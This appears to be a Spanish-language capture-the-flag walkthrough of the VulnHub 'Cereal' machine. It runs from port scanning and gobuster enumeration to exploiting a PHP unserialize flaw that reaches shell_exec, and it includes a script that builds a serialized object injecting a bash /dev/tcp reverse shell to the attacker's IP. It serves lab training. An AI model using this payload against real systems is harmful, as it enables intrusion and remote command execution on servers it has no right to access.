Primero descargamos la máquina desde vulnhub

Escaneando los puertos abiertos le damos a la que dice VMware porque claramente es esa
```
arp-scan  --localnet
```
![[Pasted image 20240615001531.png]]
y escaneamos que puertos tiene abierto: 
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.37 -oG allPorts
```
Ahora utilizamos nuestro script de bash para quedarme solo con los puertos qeu estén abiertos
```
#!/bin/bash

extractPorts () {
    echo "[*] Starting extraction process..." # Línea de depuración

    if [ -z "$1" ]; then
        echo "[!] No input file provided."
        return 1
    fi

    if [ ! -f "$1" ]; then
        echo "[!] File '$1' does not exist."
        return 1
    fi

    echo "[*] Reading file: $1" # Línea de depuración

    # Extract open ports and join them with commas
    ports=$(grep -oP '\d{1,5}/open' "$1" | awk -F '/' '{print $1}' | xargs | tr ' ' ',')
    echo "[*] Ports found: $ports" # Línea de depuración

    # Extract the IP address from the file
    ip_address=$(grep -oP '^Host: \K.*(?= \(\))' "$1" | head -n 1)
    echo "[*] IP Address found: $ip_address" # Línea de depuración

    # Output extraction information to a temporary file
    echo -e "\n[*] Extracting Information... \n" > extractPorts.tmp
    echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
    echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
    
    # Copy ports to clipboard
    echo "$ports" | tr -d '\n' | xclip -sel clip
    
    # Notify user that ports have been copied to clipboard
    echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
    
    # Display the contents of the temporary file
    cat extractPorts.tmp
    
    # Remove the temporary file
    rm extractPorts.tmp
}

# Llamada a la función con el argumento del archivo
extractPorts "$1"
```
Utilizamos nmap para que enumere los puertos
```
nmap -sCV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.1.37 -oN targeted
```
Hacemos un ataque
```
gobuster dir -u http://192.168.1.37/ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```
Para que la máquina reconozco el servidor de la máquina víctima nos vamos a /etc/host y agregamos la sig línea:
![[Pasted image 20240615014119.png]]
## Consejo
(Tabmién probar el gobuster por todos los puertos disponibles)
Cuando te lleva la web al buscador y no directamente a la página, hacemos un
```
about:config
browser.fixup.domainsuffixwhitelist.ctf
```
y lo ajustas en boolean, volvamos a la máquina

buscamos dentro del puerto 44441 los dominios
```
gobuster vhost -u http://cereal.ctf:44441/ -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```
Y descubrimos una página gracias a buscar en este puerto que es el secure.cereal.ctf
![[Pasted image 20240615020651.png]]
si enviamos un paquete y escuchamos con tcpdump
![[Pasted image 20240615020722.png]]
Osea que podríamos inyectarle comandos porque detrás se está ejecuntando una query así:
![[Pasted image 20240615020854.png]]
y yo podria comentar lo útlimo y me lo interpretaría de la siguiente manera:
![[Pasted image 20240615020933.png]]
```
gobuster dir -u http://cereal.ctf:44441/ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
```
```
gobuster vhost -u http://cereal.ctf:44441/ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.bak
```
damos con la url: http://secure.cereal.ctf:44441/php.js
le metemos un view-source:
view-source:http://secure.cereal.ctf:44441/php.js
Donde no está sanitizado![[Pasted image 20240615023511.png]]
```php
<?php

class pingTest {
 public $ipAddress = "127.0.0.1";
 #cambiamos la ip 
 public $isValid = False;
 #seteamos a true
 public $output = "";

 function validate() {
 #Esto se ejecuta cuando sea false, y eso pasa cuando la ip no es real
  if (!$this->isValid) {
   if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
   {
    $this->isValid = True;
    #Sustituye Ip addres por lo que le indicas
   }
  }
  $this->ping();

 }
#Se ejecuta cuando es true
 public function ping()
        {
  if ($this->isValid) {
  #ESTO NO ESTA SANITIZADO PORQUE CONFÍA EN EL INPUT DEL CLIENTE
   $this->output = shell_exec("ping -c 3 $this->ipAddress");
  }
        }

}
#Si he proporcionado un valor para el objeto
if (isset($_POST['obj'])) {
 $pingTest = unserialize(urldecode($_POST['obj']));
} else {
 $pingTest = new pingTest;
}

$pingTest->validate();

echo "<html>
<head>
<script src=\"http://secure.cereal.ctf:44441/php.js\"></script>
<script>
function submit_form() {
  var object = serialize({ipAddress: document.forms[\"ipform\"].ip.value});
  object = object.substr(object.indexOf(\"{\"),object.length);
  object = \"O:8:\\\"pingTest\\\":1:\" + object;
  document.forms[\"ipform\"].obj.value = object;
  document.getElementById('ipform').submit();
}
</script>
<link rel='stylesheet' href='http://secure.cereal.ctf:44441/style.css' media='all' />
<title>Ping Test</title>
</head>
<body>
<div class=\"form-body\">
<div class=\"row\">
    <div class=\"form-holder\">
 <div class=\"form-content\">
     <div class=\"form-items\">
  <h3>Ping Test</h3>

  <form method=\"POST\" action=\"/\" id=\"ipform\" onsubmit=\"submit_form();\" class=\"requires-validation\" novalidate>

      <div class=\"col-md-12\">
   <input name=\"obj\" type=\"hidden\" value=\"\">
         <input class=\"form-control\" type=\"text\" name=\"ip\" placeholder=\"IP Address\" required>
      </div>
  <br />
      <div class=\"form-button mt-3\">
   <input type=\"submit\" value=\"Ping!\">
   <br /><br /><textarea>$pingTest->output</textarea>
      </div>
  </form>
     </div>
 </div>
    </div>
</div>
</div>
</body>
</html>";

?>
```
Si lo interceptamos en Burpsuite la misma petición se puede ver urlencodeada
Ese de acá
![[Pasted image 20240615030143.png]]
Entonces lo que nos interesa es pasar la verificación y que se ejecute directamente la ip sin ser necesariamente una ip. Vamos con un file llamado "Sanatize"
```
<?php

class pingTest {
 public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.1.36/443 0>&1'";
 public $isValid = True;
 public $output = "";
}

echo urlencode(serialize(new pingTest));
?>
```

Ejecutamos el código y tenemos el nuevo [[objeto]], el cual estaba expuesto en el burpsuite
![[Pasted image 20240615030355.png]]
Poniendome en escucha por el puerto 443 entablo la reverse shell
![[Pasted image 20240615031111.png]]